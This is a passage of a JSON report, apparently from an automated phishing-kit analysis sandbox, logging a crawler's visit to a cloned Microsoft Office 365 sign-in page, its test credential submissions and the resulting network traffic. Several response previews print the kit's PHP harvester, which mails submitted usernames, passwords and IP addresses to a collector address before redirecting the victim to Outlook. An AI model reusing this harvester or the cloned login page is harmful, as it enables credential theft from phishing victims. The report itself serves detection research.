+              "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+              "timestamp": 1777777230960
+            },
+            {
+              "step": 1,
+              "phase": "submit_click",
+              "eventType": "submit",
+              "targetXPath": "/html/body/div[4]/table/tbody/tr/td/div[2]/div/ul/li[2]/form",
+              "targetTag": "FORM",
+              "targetName": "",
+              "targetType": "",
+              "targetValue": "",
+              "key": null,
+              "keyCode": null,
+              "defaultPrevented": false,
+              "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+              "timestamp": 1777777230961
+            }
+          ],
+          "html5Validation": [],
+          "triggeredFunctions": [],
+          "cdpNetworkReqs": [
+            {
+              "requestId": "80455.44",
+              "sequence": 10,
+              "resourceType": "XHR",
+              "initiatorType": "script",
+              "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+              "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+              "method": "POST",
+              "requestHeaders": {
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+              },
+              "requestHeaderNames": [
+                "Content-Type",
+                "Referer",
+                "User-Agent"
+              ],
+              "requestContentType": "application/x-www-form-urlencoded",
+              "hasCookieHeader": false,
+              "associatedCookies": [],
+              "customRequestHeaders": {},
+              "postData": "username=dkgt%40tesq.com&passwd=S1mW286",
+              "status": 200,
+              "statusText": "OK",
+              "redirected": false,
+              "redirectChain": [],
+              "redirectLocation": "",
+              "responseHeaders": {
+                "Connection": "Keep-Alive",
+                "Content-Encoding": "gzip",
+                "Content-Length": "391",
+                "Content-Type": "text/html; charset=UTF-8",
+                "Date": "Sun, 03 May 2026 03:00:30 GMT",
+                "Keep-Alive": "timeout=5, max=74",
+                "Server": "Apache/2.4.58 (Ubuntu)",
+                "Vary": "Accept-Encoding"
+              },
+              "responseContentType": "text/html; charset=UTF-8",
+              "hasSetCookie": false,
+              "responseReturned": true,
+              "responseBodyPreview": "<?\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"-----------  ! +Citi LOGIN ! xDD+ !  -----------\\n\";\r\n$message .= \"-----------  ! +Account infoS+ !  -----------\\n\";\r\n$message .= \"Email Address        : \".$_POST['username'].\"\\n\";\r\n$message .= \"Password               : \".$_POST['passwd'].\"\\n\";\r\n$message .= \"IP Address             : \".$ip.\"\\n\";\r\n$message .= \"-----------  ! +nJoY+ !  -----------\\n\";\r\n$send = \"[REDACTED_EMAIL_3f09c76d]\";\r\n\r\n$subject = \"Office365 logs xD $ip\";\r\n$headers = \"From:  El Patron<[REDACTED_EMAIL_0ad5510e]>\";\r\n$headers .= $_POST['eMailAdd'].\"\\n\";\r\n$headers .= \"MIME-Version: 1.0\\n\";\r\n$arr=array($send, $IP);\r\nforeach ($arr as $send)\r\nmail($send,$subject,$message,$headers);\r\n\r\n\r\nheader(\"Location: https://outlook.office.com\");",
+              "responseBodyLength": 746,
+              "loadingFinished": true,
+              "loadingFailed": false,
+              "errorText": "",
+              "encodedDataLength": 642,
+              "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+              "mimeType": "text/html",
+              "protocol": "http/1.1",
+              "timestamp": 22856.706547,
+              "lastEventTs": 1777777231467,
+              "requestSentTs": 22856.706547,
+              "responseReceivedTs": 22856.709223,
+              "loadingFinishedTs": 22856.708705,
+              "latencyMs": 2.2,
+              "ttfbMs": 2.7,
+              "_timing_summary": {
+                "latencyMs": 2.2,
+                "ttfbMs": 2.7,
+                "protocol": "http/1.1",
+                "redirected": false,
+                "redirectChain": [],
+                "status": 200,
+                "hasCookieHeader": false,
+                "hasSetCookie": false
+              }
+            }
+          ],
+          "jqueryDispatchLogs": []
+        },
+        "submit_trigger_ts_ms": 1777777230918,
+        "submit_timing": {
+          "python_click_ts_ms": 1777777230918,
+          "js_trigger_event_ts_ms": 1777777230960,
+          "js_first_req_ts_ms": 1777777230961,
+          "event_to_request_ms": 1,
+          "cdp_req_count": 1
+        },
+        "submit_detail": {
+          "action": "office.php",
+          "fields": {
+            "passwd": "S1mW286",
+            "username": "dkgt@tesq.com"
+          },
+          "method": "POST",
+          "responseContentType": "text/html; charset=UTF-8",
+          "responseLength": 746,
+          "status": 200,
+          "submitted": true,
+          "cdp_network": [
+            {
+              "requestId": "80455.44",
+              "sequence": 10,
+              "resourceType": "XHR",
+              "initiatorType": "script",
+              "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+              "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+              "method": "POST",
+              "requestHeaders": {
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+              },
+              "requestHeaderNames": [
+                "Content-Type",
+                "Referer",
+                "User-Agent"
+              ],
+              "requestContentType": "application/x-www-form-urlencoded",
+              "hasCookieHeader": false,
+              "associatedCookies": [],
+              "customRequestHeaders": {},
+              "postData": "username=dkgt%40tesq.com&passwd=S1mW286",
+              "status": 200,
+              "statusText": "OK",
+              "redirected": false,
+              "redirectChain": [],
+              "redirectLocation": "",
+              "responseHeaders": {
+                "Connection": "Keep-Alive",
+                "Content-Encoding": "gzip",
+                "Content-Length": "391",
+                "Content-Type": "text/html; charset=UTF-8",
+                "Date": "Sun, 03 May 2026 03:00:30 GMT",
+                "Keep-Alive": "timeout=5, max=74",
+                "Server": "Apache/2.4.58 (Ubuntu)",
+                "Vary": "Accept-Encoding"
+              },
+              "responseContentType": "text/html; charset=UTF-8",
+              "hasSetCookie": false,
+              "responseReturned": true,
+              "responseBodyPreview": "<?\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"-----------  ! +Citi LOGIN ! xDD+ !  -----------\\n\";\r\n$message .= \"-----------  ! +Account infoS+ !  -----------\\n\";\r\n$message .= \"Email Address        : \".$_POST['username'].\"\\n\";\r\n$message .= \"Password               : \".$_POST['passwd'].\"\\n\";\r\n$message .= \"IP Address             : \".$ip.\"\\n\";\r\n$message .= \"-----------  ! +nJoY+ !  -----------\\n\";\r\n$send = \"[REDACTED_EMAIL_3f09c76d]\";\r\n\r\n$subject = \"Office365 logs xD $ip\";\r\n$headers = \"From:  El Patron<[REDACTED_EMAIL_0ad5510e]>\";\r\n$headers .= $_POST['eMailAdd'].\"\\n\";\r\n$headers .= \"MIME-Version: 1.0\\n\";\r\n$arr=array($send, $IP);\r\nforeach ($arr as $send)\r\nmail($send,$subject,$message,$headers);\r\n\r\n\r\nheader(\"Location: https://outlook.office.com\");",
+              "responseBodyLength": 746,
+              "loadingFinished": true,
+              "loadingFailed": false,
+              "errorText": "",
+              "encodedDataLength": 642,
+              "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+              "mimeType": "text/html",
+              "protocol": "http/1.1",
+              "timestamp": 22856.706547,
+              "lastEventTs": 1777777231467,
+              "requestSentTs": 22856.706547,
+              "responseReceivedTs": 22856.709223,
+              "loadingFinishedTs": 22856.708705,
+              "latencyMs": 2.2,
+              "ttfbMs": 2.7,
+              "_timing_summary": {
+                "latencyMs": 2.2,
+                "ttfbMs": 2.7,
+                "protocol": "http/1.1",
+                "redirected": false,
+                "redirectChain": [],
+                "status": 200,
+                "hasCookieHeader": false,
+                "hasSetCookie": false
+              }
+            }
+          ]
+        }
+      },
+      "overall_classification": "Case B: Server Round-trip (AJAX)",
+      "field_stats": {
+        "dom_analysable": 2,
+        "visible_now": 2,
+        "hidden_or_collapsed": 0
+      },
+      "static_action_analysis": {
+        "server_file": "office/office.php",
+        "receives_fields": [
+          "eMailAdd",
+          "passwd",
+          "username"
+        ],
+        "actions": [
+          {
+            "type": "mail",
+            "target": "[REDACTED_EMAIL]",
+            "variable": "$send",
+            "line": 17
+          },
+          {
+            "type": "redirect",
+            "target": "https://outlook.office.com",
+            "line": 20
+          }
+        ],
+        "exfil": [
+          "email:[REDACTED_EMAIL]"
+        ]
+      },
+      "page_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html"
+    }
+  ],
+  "visited_urls": [
+    {
+      "step": 1,
+      "requested_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+      "actual_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+      "method": "get"
+    },
+    {
+      "step": 2,
+      "requested_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+      "actual_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+      "method": "get"
+    }
+  ],
+  "cdp_network": [
+    {
+      "requestId": "0E95D47B36C91E15CA1B33E519E27351",
+      "sequence": 1,
+      "resourceType": "Document",
+      "initiatorType": "other",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+      "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+      "method": "POST",
+      "requestHeaders": {
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Cache-Control": "no-cache",
+        "Connection": "keep-alive",
+        "Content-Length": "44",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Host": "www.2026.com:8080",
+        "Origin": "http://www.2026.com:8080",
+        "Pragma": "no-cache",
+        "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+        "Upgrade-Insecure-Requests": "1",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      },
+      "requestHeaderNames": [
+        "Accept",
+        "Accept-Encoding",
+        "Accept-Language",
+        "Cache-Control",
+        "Connection",
+        "Content-Length",
+        "Content-Type",
+        "Host",
+        "Origin",
+        "Pragma",
+        "Referer",
+        "Upgrade-Insecure-Requests",
+        "User-Agent"
+      ],
+      "requestContentType": "application/x-www-form-urlencoded",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": "username=cpaz%40tesq.com&passwd=kQZhGdxtp3UT",
+      "status": 200,
+      "statusText": "OK",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {
+        "Connection": "Keep-Alive",
+        "Content-Encoding": "gzip",
+        "Content-Length": "391",
+        "Content-Type": "text/html; charset=UTF-8",
+        "Date": "Sun, 03 May 2026 03:00:27 GMT",
+        "Keep-Alive": "timeout=5, max=77",
+        "Server": "Apache/2.4.58 (Ubuntu)",
+        "Vary": "Accept-Encoding"
+      },
+      "responseContentType": "text/html; charset=UTF-8",
+      "hasSetCookie": false,
+      "responseReturned": true,
+      "responseBodyPreview": "<?\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"-----------  ! +Citi LOGIN ! xDD+ !  -----------\\n\";\r\n$message .= \"-----------  ! +Account infoS+ !  -----------\\n\";\r\n$message .= \"Email Address        : \".$_POST['username'].\"\\n\";\r\n$message .= \"Password               : \".$_POST['passwd'].\"\\n\";\r\n$message .= \"IP Address             : \".$ip.\"\\n\";\r\n$message .= \"-----------  ! +nJoY+ !  -----------\\n\";\r\n$send = \"[REDACTED_EMAIL_3f09c76d]\";\r\n\r\n$subject = \"Office365 logs xD $ip\";\r\n$headers = \"From:  El Patron<[REDACTED_EMAIL_0ad5510e]>\";\r\n$headers .= $_POST['eMailAdd'].\"\\n\";\r\n$headers .= \"MIME-Version: 1.0\\n\";\r\n$arr=array($send, $IP);\r\nforeach ($arr as $send)\r\nmail($send,$subject,$message,$headers);\r\n\r\n\r\nheader(\"Location: https://outlook.office.com\");",
+      "responseBodyLength": 746,
+      "loadingFinished": true,
+      "loadingFailed": false,
+      "errorText": "",
+      "encodedDataLength": 642,
+      "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+      "mimeType": "text/html",
+      "protocol": "http/1.1",
+      "timestamp": 22853.710775,
+      "lastEventTs": 1777777227979,
+      "requestSentTs": 22853.710775,
+      "responseReceivedTs": 22853.714474,
+      "loadingFinishedTs": 22853.714131,
+      "latencyMs": 3.4,
+      "ttfbMs": 3.7,
+      "_native_submit": true,
+      "_submit_trigger_ts_ms": 1777777227912
+    },
+    {
+      "requestId": "BB761901A1823E30E0AF48E666EA8B36",
+      "sequence": 2,
+      "resourceType": "Document",
+      "initiatorType": "other",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+      "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+      "method": "GET",
+      "requestHeaders": {
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Cache-Control": "no-cache",
+        "Connection": "keep-alive",
+        "Host": "www.2026.com:8080",
+        "Pragma": "no-cache",
+        "Upgrade-Insecure-Requests": "1",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      },
+      "requestHeaderNames": [
+        "Accept",
+        "Accept-Encoding",
+        "Accept-Language",
+        "Cache-Control",
+        "Connection",
+        "Host",
+        "Pragma",
+        "Upgrade-Insecure-Requests",
+        "User-Agent"
+      ],
+      "requestContentType": "",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": null,
+      "status": 200,
+      "statusText": "OK",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {
+        "Accept-Ranges": "bytes",
+        "Connection": "Keep-Alive",
+        "Content-Encoding": "gzip",
+        "Content-Length": "8871",
+        "Content-Type": "text/html",
+        "Date": "Sun, 03 May 2026 03:00:28 GMT",
+        "ETag": "\"9927-53f77028ce700-gzip\"",
+        "Keep-Alive": "timeout=5, max=76",
+        "Last-Modified": "Sat, 22 Oct 2016 16:54:20 GMT",
+        "Server": "Apache/2.4.58 (Ubuntu)",
+        "Vary": "Accept-Encoding"
+      },
+      "responseContentType": "text/html",
+      "hasSetCookie": false,
+      "responseReturned": true,
+      "responseBodyPreview": "<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\">\r\n<!-- saved from url=(0371)https://login.microsoftonline.com/common/oauth2/authorize?response_mode=form_post&response_type=id_token&scope=openid&msafed=0&nonce=7b032a44-3642-4168-9f17-aab61c3cd3ff&state=https%3a%2f%2foffice.live.com%2fstart%2fOneDrive.aspx%3fs%3d4%26auth%3d2%26nf%3d1&client_id=4b233688-031c-404b-9a80-a4f3f2351f90&redirect_uri=https%3a%2f%2foffice.live.com%2fstart%2fauth%2fsignin -->\r\n<html dir=\"ltr\" style=\"background-color: rgb(235, 60, 0);\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\r\n        \r\n\r\n\r\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n<meta http-equiv=\"Pragma\" content=\"no-cache\">\r\n<meta http-equiv=\"Expires\" content=\"-1\">\r\n<meta name=\"PageID\" content=\"i5030.2.0\">\r\n<meta name=\"SiteID\" content=\"\">\r\n<meta name=\"ReqLC\" content=\"1033\">\r\n<meta name=\"LocLC\" content=\"en-US\">\r\n<meta name=\"mswebdialog-newwindowurl\" content=\"*\">\r\n\r\n\r\n\r\n\r\n    <link rel=\"SHORTCUT ICON\" href=\"https://secure.aadcdn.microsoftonline-p.com/ests/2.1.4856.11/content/images/favicon_a.ico\">\r\n\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes\">\r\n<link href=\"files/login.min.css\" rel=\"stylesheet\">\r\n\r\n\r\n\r\n<style>\r\n    .no_display {\r\n        display: none;\r\n    }\r\n</style>\r\n\r\n\r\n<!--[if lte IE 10]>\r\n    <link href=\"https://secure.aadcdn.microsoftonline-p.com/ests/2.1.4856.11/content/cdnbundles/login_ie.min.css\" rel=\"stylesheet\" />\r\n\r\n<![endif]-->\r\n\r\n<!--[if lte IE 7]>\r\n  <style type='text/css'>\r\n    .ie_legacy { display: none; }\r\n    body { background-color: #0072C6; }\r\n  </style>\r\n<![endif]-->\r\n\r\n<link id=\"hovereffect\" rel=\"stylesheet\" type=\"text/css\" href=\"files/login_hover.min.css\" media=\"all\">\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<style>\r\n    body\r\n    {\r\n        display: none;\r\n    }\r\n</style>\r\n\r\n        <title>\r\nSign in to your account        </title>\r\n    </head>\r\n    <body style=\"display: block;\" cz-shortcut",
+      "responseBodyLength": 39202,
+      "loadingFinished": true,
+      "loadingFailed": false,
+      "errorText": "",
+      "encodedDataLength": 9209,
+      "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+      "mimeType": "text/html",
+      "protocol": "http/1.1",
+      "timestamp": 22854.258427,
+      "lastEventTs": 1777777228548,
+      "requestSentTs": 22854.258427,
+      "responseReceivedTs": 22854.261459,
+      "loadingFinishedTs": 22854.261677,
+      "latencyMs": 3.2,
+      "ttfbMs": 3.0
+    },
+    {
+      "requestId": "80455.31",
+      "sequence": 3,
+      "resourceType": "Stylesheet",
+      "initiatorType": "parser",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+      "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/files/login.min.css",
+      "method": "GET",
+      "requestHeaders": {
+        "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      },
+      "requestHeaderNames": [
+        "Referer",
+        "User-Agent"
+      ],
+      "requestContentType": "",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": null,
+      "status": 200,
+      "statusText": "OK",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {
+        "Accept-Ranges": "bytes",
+        "Connection": "Keep-Alive",
+        "Content-Encoding": "gzip",
+        "Content-Length": "4721",
+        "Content-Type": "text/css",
+        "Date": "Sun, 03 May 2026 03:00:28 GMT",
+        "ETag": "\"5492-53e19b3406680-gzip\"",
+        "Keep-Alive": "timeout=5, max=75",
+        "Last-Modified": "Wed, 05 Oct 2016 08:09:46 GMT",
+        "Server": "Apache/2.4.58 (Ubuntu)",
+        "Vary": "Accept-Encoding"
+      },
+      "responseContentType": "text/css",
+      "hasSetCookie": false,
+      "responseReturned": true,
+      "responseBodyPreview": "@charset \"utf-8\";@-ms-viewport{width:device-width;height:device-height}*{margin:0;padding:0;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}html{background:#0072c6 no-repeat top left fixed;-webkit-background-size:cover;-mox-background-size:cover;-o-background-size:cover;background-size:cover}body{margin:0;padding:0;z-index:-999;text-align:left}table{border-spacing:0;border-collapse:collapse}td,th{padding:0}html,body,.login_panel{height:100%}#login_panel{display:none;border-left:1px solid #fff}#auto_low_bandwidth_background_notification{visibility:hidden;padding-left:10px;padding-top:5px;padding-right:500px;color:#fff}#background_company_name_text{color:#fff;margin-right:500px;position:relative;top:50%;margin-top:-0.7em;text-align:center}#login_workload_logo_image{max-width:300px;max-height:60px}a{text-decoration:none;color:#2872dd;background-color:transparent}img{border:0}form{width:auto;height:auto}h1{font-weight:normal}.rtl{display:none}.ltr{display:inline}.tinytext{font-size:.7em;font-family:'Segoe UI','Segoe','SegoeUI-Regular-final',Tahoma,Helvetica,Arial,sans-serif}.smalltext{font-size:.8em;font-family:'Segoe UI','Segoe','SegoeUI-Regular-final',Tahoma,Helvetica,Arial,sans-serif}.normaltext{font-size:.9em;font-family:'Segoe UI','Segoe','SegoeUI-Regular-final',Tahoma,Helvetica,Arial,sans-serif}.bigtext{color:#626262;font-size:1.2em;font-family:'Segoe UI Light','Segoe','Segoe UI','SegoeUI-Light-final',Tahoma,Helvetica,Arial,sans-serif;font-weight:lighter;-o-text-overflow:ellipsis;text-overflow:ellipsis;overflow:hidden;white-space:nowrap;margin-right:0}div.wrap{white-space:normal}.gianttext{color:#333;font-size:1.8em;font-family:'Segoe UI Light','Segoe','Segoe UI','SegoeUI-Light-final',Tahoma,Helvetica,Arial,sans-serif;font-weight:lighter}.infotext{color:#333}.background_title_text{color:#333;font-size:5em;font-family:'Segoe UI Light','Segoe','Segoe UI','SegoeUI-Light-final',Tahoma,Helvetica,Arial,sans-serif}.login_full_error_containe",
+      "responseBodyLength": 21650,
+      "loadingFinished": true,
+      "loadingFailed": false,
+      "errorText": "",
+      "encodedDataLength": 5058,
+      "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/files/login.min.css",
+      "mimeType": "text/css",
+      "protocol": "http/1.1",
+      "timestamp": 22854.268131,
+      "lastEventTs": 1777777228534,
+      "requestSentTs": 22854.268131,
+      "responseReceivedTs": 22854.276483,
+      "loadingFinishedTs": 22854.274545,
+      "latencyMs": 6.4,
+      "ttfbMs": 8.4
+    },
+    {
+      "requestId": "80455.32",
+      "sequence": 4,
+      "resourceType": "Stylesheet",
+      "initiatorType": "parser",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+      "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/files/login_hover.min.css",
+      "method": "GET",
+      "requestHeaders": {
+        "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      },
+      "requestHeaderNames": [
+        "Referer",
+        "User-Agent"
+      ],
+      "requestContentType": "",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": null,
+      "status": 200,
+      "statusText": "OK",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {
+        "Accept-Ranges": "bytes",
+        "Connection": "Keep-Alive",
+        "Content-Encoding": "gzip",
+        "Content-Length": "82",
+        "Content-Type": "text/css",
+        "Date": "Sun, 03 May 2026 03:00:28 GMT",
+        "ETag": "\"59-53e19b3406680-gzip\"",
+        "Keep-Alive": "timeout=5, max=90",
+        "Last-Modified": "Wed, 05 Oct 2016 08:09:46 GMT",
+        "Server": "Apache/2.4.58 (Ubuntu)",
+        "Vary": "Accept-Encoding"
+      },
+      "responseContentType": "text/css",
+      "hasSetCookie": false,
+      "responseReturned": true,
+      "responseBodyPreview": ".button:hover{background:#d4e3fb}.cred_cancel_button:hover{background:#d6d6d6;color:#000}",
+      "responseBodyLength": 89,
+      "loadingFinished": true,
+      "loadingFailed": false,
+      "errorText": "",
+      "encodedDataLength": 415,
+      "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/files/login_hover.min.css",
+      "mimeType": "text/css",
+      "protocol": "http/1.1",
+      "timestamp": 22854.268261,
+      "lastEventTs": 1777777228535,
+      "requestSentTs": 22854.268261,
+      "responseReceivedTs": 22854.276727,
+      "loadingFinishedTs": 22854.274043,
+      "latencyMs": 5.8,
+      "ttfbMs": 8.5
+    },
+    {
+      "requestId": "80455.33",
+      "sequence": 5,
+      "resourceType": "Image",
+      "initiatorType": "parser",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+      "url": "https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-uymyxxfhpwrbckvwvlxle8radh6vkzaj7cwkqpqixg/appbranding/4gxvxxtv1vaumat9ftkvh9ewyw-wh4ibokuvhgknx7q/0/heroillustration?ts=635538653070149031",
+      "method": "GET",
+      "requestHeaders": {
+        "Referer": "http://www.2026.com:8080/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "sec-ch-ua": "\"Chromium\";v=\"145\", \"Not:A-Brand\";v=\"99\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Linux\""
+      },
+      "requestHeaderNames": [
+        "Referer",
+        "User-Agent",
+        "sec-ch-ua",
+        "sec-ch-ua-mobile",
+        "sec-ch-ua-platform"
+      ],
+      "requestContentType": "",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": null,
+      "status": null,
+      "statusText": "",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {},
+      "responseContentType": "",
+      "hasSetCookie": false,
+      "responseReturned": false,
+      "responseBodyPreview": null,
+      "responseBodyLength": null,
+      "loadingFinished": false,
+      "loadingFailed": true,
+      "errorText": "net::ERR_INTERNET_DISCONNECTED",
+      "encodedDataLength": null,
+      "responseUrl": "",
+      "mimeType": "",
+      "protocol": "",
+      "timestamp": 22854.268299,
+      "lastEventTs": 1777777228535,
+      "requestSentTs": 22854.268299,
+      "responseReceivedTs": 0.0,
+      "loadingFinishedTs": 0.0,
+      "latencyMs": null,
+      "ttfbMs": null
+    },
+    {
+      "requestId": "80455.34",
+      "sequence": 6,
+      "resourceType": "Image",
+      "initiatorType": "parser",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+      "url": "https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-uymyxxfhpwrbckvwvlxle8radh6vkzaj7cwkqpqixg/appbranding/4gxvxxtv1vaumat9ftkvh9ewyw-wh4ibokuvhgknx7q/0/bannerlogo?ts=635538653068704866",
+      "method": "GET",
+      "requestHeaders": {
+        "Referer": "http://www.2026.com:8080/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "sec-ch-ua": "\"Chromium\";v=\"145\", \"Not:A-Brand\";v=\"99\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Linux\""
+      },
+      "requestHeaderNames": [
+        "Referer",
+        "User-Agent",
+        "sec-ch-ua",
+        "sec-ch-ua-mobile",
+        "sec-ch-ua-platform"
+      ],
+      "requestContentType": "",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": null,
+      "status": null,
+      "statusText": "",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {},
+      "responseContentType": "",
+      "hasSetCookie": false,
+      "responseReturned": false,
+      "responseBodyPreview": null,
+      "responseBodyLength": null,
+      "loadingFinished": false,
+      "loadingFailed": true,
+      "errorText": "net::ERR_INTERNET_DISCONNECTED",
+      "encodedDataLength": null,
+      "responseUrl": "",
+      "mimeType": "",
+      "protocol": "",
+      "timestamp": 22854.268329,
+      "lastEventTs": 1777777228535,
+      "requestSentTs": 22854.268329,
+      "responseReceivedTs": 0.0,
+      "loadingFinishedTs": 0.0,
+      "latencyMs": null,
+      "ttfbMs": null
+    },
+    {
+      "requestId": "80455.36",
+      "sequence": 7,
+      "resourceType": "Image",
+      "initiatorType": "parser",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+      "url": "https://secure.aadcdn.microsoftonline-p.com/ests/2.1.4856.11/content/images/microsoft_logo.png",
+      "method": "GET",
+      "requestHeaders": {
+        "Referer": "http://www.2026.com:8080/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "sec-ch-ua": "\"Chromium\";v=\"145\", \"Not:A-Brand\";v=\"99\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Linux\""
+      },
+      "requestHeaderNames": [
+        "Referer",
+        "User-Agent",
+        "sec-ch-ua",
+        "sec-ch-ua-mobile",
+        "sec-ch-ua-platform"
+      ],
+      "requestContentType": "",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": null,
+      "status": null,
+      "statusText": "",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {},
+      "responseContentType": "",
+      "hasSetCookie": false,
+      "responseReturned": false,
+      "responseBodyPreview": null,
